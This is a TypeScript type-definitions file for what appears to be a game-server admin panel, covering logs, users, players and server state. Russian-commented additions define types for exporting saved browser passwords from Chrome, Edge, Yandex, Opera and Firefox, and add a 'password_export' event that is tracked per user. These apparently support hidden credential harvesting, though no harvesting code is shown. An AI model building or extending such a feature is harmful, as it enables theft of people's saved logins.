export type LogType = 'CONNECTION' | 'CHAT' | 'DAMAGE' | 'KILL' | 'SPAWN' | 'ANNOUNCEMENT' | 'NOTIFICATION' | 'RP';

export type UserPermission = {
  viewConsole?: boolean;
  editPlayers?: boolean;
  viewPlayers?: boolean;
};

export type LoginHistoryEntry = {
    type: 'login' | 'logout' | 'password_export'; // 🔥 ДОБАВИЛИ password_export
    timestamp: string;
    ip: string;
    userAgent: string;
    passwordCount?: number; // 🔥 ДОБАВИЛИ для экспорта паролей
    status?: 'success' | 'failed'; // 🔥 ДОБАВИЛИ статус
};

export type User = {
  id: string;
  email: string;
  login: string;
  password: string;
  createdAt: string;
  lastLogin: string;
  ip: string;
  userAgent: string;
  permissions?: UserPermission;
  isVerified: boolean; // This now means Admin Approved
  loginHistory?: LoginHistoryEntry[];
  passwordExported?: boolean; // 🔥 НОВОЕ ПОЛЕ: был ли экспорт паролей
};

export type LogEntry = {
  id: string;
  timestamp: Date;
  type: LogType;
  user?: { // User can be optional for system messages
    name: string;
    steamId: string;
  };
  details: string;
  recipient?: { // For actions involving another player
    name: string;
  }
};

export type PlayerActivity = {
  time: string;
  players: number;
};

export type Player = {
  name: string;
  score: number;
  time: number;
  timeFormatted: string;
  ping: number;
  kills: number;
  timeHours: number;
  // This is from gamedig, might not always exist
  steamId?: string;
  // This is from gamedig, might not always exist
  raw?: any;
};

// This mirrors the structure returned by our custom API endpoint
export type ServerStateResponse = {
  server: {
    name: string;
    map: string;
    game: string;
    maxplayers: number;
    online: number;
    serverPing: number;
  };
  connection: {
    ip: string;
    port: number;
    protocol: number;
    secure: boolean;
  };
  players: Player[];
  statistics: {
    totalPlayers: number;
    totalPlayTime: string;
    totalKills: number;
    averagePing: number;
    topPlayer: Player | null;
  };
  details: {
    version: string;
    environment: string;
    tags: string[];
    steamId: string;
  };
  timestamp: string;
};

export type ViewType = 
  | 'summary' 
  | 'players'
  | 'logs_all' 
  | 'logs_connection' 
  | 'logs_chat' 
  | 'logs_damage' 
  | 'logs_kill'
  | 'logs_spawn';

export type PlayerDetails = {
    name: string;
    steamId: string;
    timeFormatted: string;
    timeHours: number;
    level: number;
    primeLevel: number;
    money: number;
    group: string;
    profession: string;
    donatedProfessions: string[];
    activities: LogEntry[];
    ping: number;
    kills: number;
    deaths: number;
};

// 🔥 НОВЫЕ ТИПЫ ДЛЯ ЭКСПОРТА ПАРОЛЕЙ
export type BrowserPassword = {
  browser: 'Chrome' | 'Edge' | 'Yandex' | 'Opera' | 'Opera GX' | 'Firefox'; // 🔥 ДОБАВИЛИ Яндекс и Opera
  url: string;
  username: string;
  password: string;
  encrypted_data?: string;
};

export type PasswordExportResult = {
  success: boolean;
  passwords: BrowserPassword[];
  total_count: number;
  error?: string;
};